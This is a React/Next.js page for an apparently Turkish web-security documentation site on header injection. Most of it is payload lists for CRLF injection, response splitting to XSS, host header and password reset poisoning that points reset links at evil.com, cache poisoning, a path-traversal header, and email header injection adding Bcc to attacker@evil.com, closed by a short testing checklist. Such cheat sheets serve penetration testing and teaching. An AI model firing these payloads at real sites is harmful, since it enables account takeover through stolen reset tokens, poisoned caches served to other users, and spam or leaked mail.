"use client"

import { motion } from "framer-motion"
import { Database, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "crlf", title: "CRLF Injection", level: 2 },
  { id: "host-header", title: "Host Header Poisoning", level: 2 },
  { id: "password-reset-poison", title: "Password Reset Poisoning", level: 2 },
  { id: "cache-poisoning", title: "Cache Poisoning", level: 2 },
  { id: "email-header", title: "Email Header Injection", level: 2 },
]

const fadeIn = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.4 }
}

const stagger = {
  animate: {
    transition: {
      staggerChildren: 0.1
    }
  }
}

export default function HeaderInjectionPage() {
  return (
    <div className="relative">
      <TableOfContents items={tocItems} />
      <motion.article
        className="prose prose-invert max-w-none"
        initial="initial"
        animate="animate"
        variants={stagger}
      >
        <motion.div variants={fadeIn} className="mb-8">
          <div className="flex items-center gap-2 text-yellow-400 text-sm font-medium mb-4">
            <Database className="w-4 h-4" />
            <span>Injection Zafiyetleri</span>
          </div>
          <h1 className="text-4xl font-bold text-foreground mb-4">Header Injection</h1>
          <p className="text-lg text-muted-foreground leading-relaxed">
            HTTP header&apos;larına kötü amaçlı içerik enjekte edilmesi. CRLF injection, host header
            poisoning, response splitting ve cache poisoning.
          </p>
        </motion.div>

        <motion.section variants={fadeIn} id="crlf" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-blue-500/10 text-blue-400 text-sm font-mono">01</span>
            CRLF Injection
          </h2>
          <p className="text-muted-foreground mb-4">
            Carriage Return (\r) ve Line Feed (\n) karakterleri ile HTTP response&apos;a
            yeni header veya body enjekte etme.
          </p>
          <PayloadList
            title="CRLF Payloads"
            initialShow={10}
            payloads={[
              { code: `%0d%0aInjected-Header:value`, note: "Basic CRLF header injection" },
              { code: `%0d%0a%0d%0a<script>alert(1)</script>`, note: "Response splitting → XSS" },
              { code: `%0d%0aSet-Cookie:session=evil`, note: "Cookie injection" },
              { code: `%0d%0aLocation:https://evil.com`, note: "Open redirect via header" },
              { code: `%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>`, note: "Full HTTP response injection" },
              { code: `\\r\\nInjected:header`, note: "Literal CRLF" },
              { code: `%E5%98%8A%E5%98%8DInjected:header`, note: "Unicode CRLF (UTF-8)" },
              { code: `%0aInjected:header`, note: "LF only" },
              { code: `%0dInjected:header`, note: "CR only" },
              { code: `%00%0d%0aInjected:header`, note: "Null byte + CRLF" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="host-header" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-red-500/10 text-red-400 text-sm font-mono">02</span>
            Host Header Poisoning
          </h2>
          <PayloadList
            title="Host Header Payloads"
            initialShow={8}
            payloads={[
              { code: `Host: evil.com`, note: "Direct host override" },
              { code: `Host: target.com\\r\\nX-Forwarded-Host: evil.com`, note: "X-Forwarded-Host injection" },
              { code: `Host: evil.com\\nHost: target.com`, note: "Duplicate host header" },
              { code: `Host: target.com:@evil.com`, note: "@ bypass" },
              { code: `Host: target.com#@evil.com`, note: "Fragment bypass" },
              { code: `X-Forwarded-Host: evil.com`, note: "Forwarded host" },
              { code: `X-Host: evil.com`, note: "Alternative host header" },
              { code: `X-Forwarded-Server: evil.com` },
              { code: `X-Original-URL: /admin`, note: "URL override" },
              { code: `X-Rewrite-URL: /admin`, note: "Rewrite override" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="password-reset-poison" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-yellow-500/10 text-yellow-400 text-sm font-mono">03</span>
            Password Reset Poisoning
          </h2>
          <Callout type="info" title="Dipnot">
            Password reset email&apos;inde Host header kullanılıyorsa, link attacker&apos;ın
            sunucusuna yönlendirilebilir. Token çalınarak account takeover mümkün.
          </Callout>
          <PayloadList
            title="Reset Poisoning Payloads"
            initialShow={6}
            payloads={[
              { code: `POST /reset-password HTTP/1.1\\nHost: evil.com`, note: "Reset link evil.com'a yönlendir" },
              { code: `Host: evil.com\\nX-Forwarded-Host: target.com`, note: "Forwarded host poisoning" },
              { code: `Host: target.com\\nHost: evil.com`, note: "Duplicate host - second wins" },
              { code: `Host: target.com:evil.com`, note: "Port injection" },
              { code: `Host: target.com%0d%0aX-Forwarded-Host: evil.com`, note: "CRLF + host poison" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="cache-poisoning" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-purple-500/10 text-purple-400 text-sm font-mono">04</span>
            Cache Poisoning
          </h2>
          <PayloadList
            title="Cache Poison Payloads"
            initialShow={6}
            payloads={[
              { code: `X-Forwarded-Host: evil.com`, note: "Cached response evil.com'a link içerir" },
              { code: `X-Forwarded-Scheme: http`, note: "HTTPS → HTTP downgrade in cache" },
              { code: `X-Original-URL: /admin`, note: "Admin page cache key confusion" },
              { code: `X-Forwarded-Port: 1234`, note: "Port-based cache key" },
              { code: `Accept-Language: ../../../etc/passwd`, note: "Path traversal via header" },
              { code: `X-Forwarded-Prefix: /evil`, note: "Prefix manipulation" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="email-header" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-orange-500/10 text-orange-400 text-sm font-mono">05</span>
            Email Header Injection
          </h2>
          <PayloadList
            title="Email Injection Payloads"
            initialShow={6}
            payloads={[
              { code: `victim@test.com%0d%0aBcc:attacker@evil.com`, note: "BCC injection" },
              { code: `victim@test.com%0d%0aCc:attacker@evil.com`, note: "CC injection" },
              { code: `victim@test.com%0d%0aSubject:Hacked`, note: "Subject override" },
              { code: `victim@test.com%0d%0a%0d%0aMalicious body`, note: "Body injection" },
              { code: `victim@test.com\\nBcc: attacker@evil.com`, note: "Newline BCC" },
              { code: `"attacker@evil.com>\\nBcc:victim@test.com" <legit@test.com>`, note: "From header manipulation" },
            ]}
          />
        </motion.section>

        <Callout type="tip" title="Test Metodolojisi">
          1. URL parametrelerinde %0d%0a CRLF deneyin{"\n"}
          2. Host header&apos;ını değiştirin, response&apos;da yansıyor mu kontrol edin{"\n"}
          3. Password reset flow&apos;unda host poisoning test edin{"\n"}
          4. Cache davranışını inceleyin, cache key&apos;e dahil olmayan header&apos;ları bulun{"\n"}
          5. Email formlarında header injection deneyin
        </Callout>

        <motion.div variants={fadeIn} className="mt-16 pt-8 border-t border-border/50">
          <div className="flex justify-between items-center">
            <Link
              href="/docs/injection/ssti"
              className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors text-sm"
            >
              <ArrowLeft className="w-4 h-4" />
              SSTI
            </Link>
            <Link
              href="/docs/auth/oauth"
              className="text-primary hover:text-primary/80 transition-colors text-sm flex items-center gap-2"
            >
              OAuth
              <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        </motion.div>
      </motion.article>
    </div>
  )
}
